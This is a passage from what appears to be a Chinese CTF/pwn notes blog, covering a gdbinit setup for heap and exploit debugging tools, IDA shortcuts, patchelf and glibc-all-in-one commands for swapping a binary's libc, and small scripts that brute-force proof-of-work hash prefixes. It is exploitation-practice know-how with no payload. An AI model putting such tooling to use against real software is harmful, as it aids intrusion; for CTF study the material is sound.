class="line"><span class="built_in">source</span> /home/deepunk/Public/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> /home/deepunk/Public/splitmind/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> context-clear-screen on</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br><span class="line"></span><br><span class="line">python</span><br><span class="line">import splitmind</span><br><span class="line">(splitmind.Mind()</span><br><span class="line">.tell_splitter(show_titles=False)</span><br><span class="line">.left(display=<span class="string">&quot;regs&quot;</span>, size=<span class="string">&quot;40%&quot;</span>)</span><br><span class="line">.below(display=<span class="string">&quot;disasm&quot;</span>, size=<span class="string">&quot;40%&quot;</span>)</span><br><span class="line">.above(of=<span class="string">&quot;main&quot;</span>, display=<span class="string">&quot;stack&quot;</span>, size=<span class="string">&quot;45%&quot;</span>)</span><br><span class="line">.right(display=<span class="string">&quot;backtrace&quot;</span>, size=<span class="string">&quot;25%&quot;</span>)</span><br><span class="line">.below(cmd=<span class="string">&quot;cmatrix&quot;</span>, size=<span class="string">&quot;40%&quot;</span>)</span><br><span class="line">.right(of=<span class="string">&quot;main&quot;</span>, cmd=<span class="string">&quot;ipython&quot;</span>, size=<span class="string">&quot;32%&quot;</span>)</span><br><span class="line">.show(<span class="string">&quot;legend&quot;</span>, on=<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">).build(nobanner=True)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> context-stack-lines 7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h4><p><code>pattc xx</code></p><p><code>crashoff</code></p><h4 id="IDA使用"><a href="#IDA使用" class="headerlink" title="IDA使用"></a>IDA使用</h4><h6 id="快捷键："><a href="#快捷键：" class="headerlink" title="快捷键："></a>快捷键：</h6><p><code>U</code>：取消已有数据类型定义</p><p><code>D</code>：变数据，1(byte&#x2F;db),2(word&#x2F;dw),3(dword&#x2F;dd),4(qword&#x2F;dq)</p><p><code>C</code>：变指令</p><p><code>A</code>：ASCII码，该位置起点，\0结尾字符串</p><p><code>*</code>：数组</p><p><code>O</code>：地址偏移</p><p><code>Y</code>：改为正确类型</p><p><code>H</code>：16进制</p><p><code>M</code>：转为枚举中的值</p><p><code>_</code>：按补码解析为负数</p><p><code>~</code>：按位取反</p><h6 id="COLOR"><a href="#COLOR" class="headerlink" title="COLOR"></a>COLOR</h6><p>黑色：代码</p><p>灰色：数据</p><p>黄色：未定义</p><h4 id="patchelf-glibc-all-in-one"><a href="#patchelf-glibc-all-in-one" class="headerlink" title="patchelf&amp;glibc-all-in-one"></a>patchelf&amp;glibc-all-in-one</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install patchelf</span><br><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one</span><br></pre></td></tr></table></figure><h5 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_list</span><br></pre></td></tr></table></figure><h5 id="下载库"><a href="#下载库" class="headerlink" title="下载库"></a>下载库</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat list</span><br><span class="line">./download xxx</span><br></pre></td></tr></table></figure><h5 id="查看libc同版本连接器"><a href="#查看libc同版本连接器" class="headerlink" title="查看libc同版本连接器"></a>查看libc同版本连接器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings xxx.so | grep ubuntu</span><br></pre></td></tr></table></figure><h5 id="查看libc"><a href="#查看libc" class="headerlink" title="查看libc"></a>查看libc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd -v pwn</span><br></pre></td></tr></table></figure><h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter 你的文件目录/ld-linux-x86-64.so.2 ./pwn</span><br><span class="line">patchelf --add-needed 你的文件目录/libc.so.6 ./pwn</span><br></pre></td></tr></table></figure><h4 id="sha256爆破脚本"><a href="#sha256爆破脚本" class="headerlink" title="sha256爆破脚本"></a>sha256爆破脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;a645e3deef85766e43c8a1aa63d1f69eed55e7cb94f10973bd76a9ace57c7311&quot;</span></span><br><span class="line">tail=<span class="string">&quot;amLSvne0g1ypVG5J&quot;</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail,encoding=<span class="string">&#x27;utf-8&#x27;</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256,encoding=<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>,<span class="number">9999999999</span>):</span><br><span class="line">    res = hashlib.sha1(<span class="built_in">str</span>(num).encode()).hexdigest() <span class="comment">#sha1改为题目需要的算法</span></span><br><span class="line">    <span class="keyword">if</span> res[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">&quot;903ed&quot;</span>:   <span class="comment">#对hash的前五位为&quot;903ed&quot;的数字进行碰撞</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(num)) <span class="comment">#等待执行结束 输出结果</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h4><p>if .plt adress endup with null byte</p><p>adress+&#x3D;6(32bit)</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
